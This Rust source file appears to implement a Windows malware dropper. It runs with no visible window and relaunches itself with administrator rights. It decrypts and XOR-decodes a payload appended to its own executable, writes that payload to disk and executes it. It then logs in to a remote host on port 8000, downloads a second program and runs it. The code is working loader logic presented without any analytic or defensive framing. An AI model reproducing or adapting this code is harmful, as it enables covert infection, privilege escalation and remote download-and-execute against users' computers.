#![windows_subsystem = "windows"]

use serde::{Deserialize, Serialize};
use sha2::digest::Reset;
use sha2::{Digest, Sha256, Sha512};
use shared::{api::*, challenge::Challenge, utils, error::*, OverlayMeta};
use std::fs;
use std::fs::{read, File};
use std::io::Write;
use std::mem::swap;
use std::str::FromStr;
use std::process::Command;
use std::path::{Path, PathBuf};
use std::env::{current_exe, join_paths};
use std::convert::TryInto;
use rsa::PaddingScheme;
use shared::utils::{decrypt, KEY, xor};

#[cfg(windows)]
use is_elevated::is_elevated;

struct Overlay {
    bytes: Vec<u8>,
    meta: OverlayMeta
}

fn reason_do_not_run() -> Option<String> {

    // already downloaded client?
    for name in vec!(utils::NAME1.to_string(), utils::NAME2.to_string()).iter() {
        if Path::new(&name).exists() {
            return Some("client already present".to_string());
        }
    }

    None
}

fn extract_overlay() -> Result<Overlay> {
    let mut bytes = read(current_exe()?)?;
    let mut offset = bytes.len();

    let encrypted_size: u32 = u32::from_be_bytes(bytes[offset-4..].try_into()?);
    offset -= 4;

    let encrypted = String::from_utf8(bytes[offset-(encrypted_size as usize)..offset].to_vec())?;
    offset -= encrypted_size as usize;

    let meta: OverlayMeta = decrypt(&encrypted, &KEY)?;
    let payload = bytes[offset-(meta.payload_size as usize)..offset].to_vec();

    Ok(Overlay {
        bytes: xor(&payload, &meta.secret),
        meta
    })
}

fn main_result() -> Result<()> {
    utils::tmpdir();

    #[cfg(windows)]
    {
        let current = current_exe().unwrap().to_str().unwrap().to_string();
        if !is_elevated() {
            runas::Command::new(current).status()?;
            return Err("not elevated".into());
        }
    }

    // ensure, that payload is extracted
    let name = current_exe()?.file_name().unwrap().to_str().unwrap().to_string();
    let path = std::env::current_dir()?.join(&name);

    // work with overlay
    let overlay = extract_overlay()?;
    if !path.exists() {
        let mut file = File::create(&path)?;
        file.write_all(&overlay.bytes)?;
    }

    // and run it!
    Command::new(&path).spawn()?;

    // ...
    utils::chdir();

    // check if we should continue?
    if let Some(reason) = reason_do_not_run() {
        return Err(reason.into());
    }

    let mut api_client = Api::new(&overlay.meta.host, 8000, false);
    api_client.login(&SystemInfo {
        cpu_total: 0.0,
        mem_total: 0.0
    })?;

    let upload = api_client.client_download()?;
    let path = utils::save(upload)?;

    // run program!
    Command::new(path).spawn()?;

    Ok(())
}

fn main() {
    if let Err(err) = main_result() {
        utils::chdir();

        // save error message on disk.
        let mut file = File::create("win.lck").unwrap();
        file.write_all(err.to_string().as_bytes()).unwrap();
    }
}
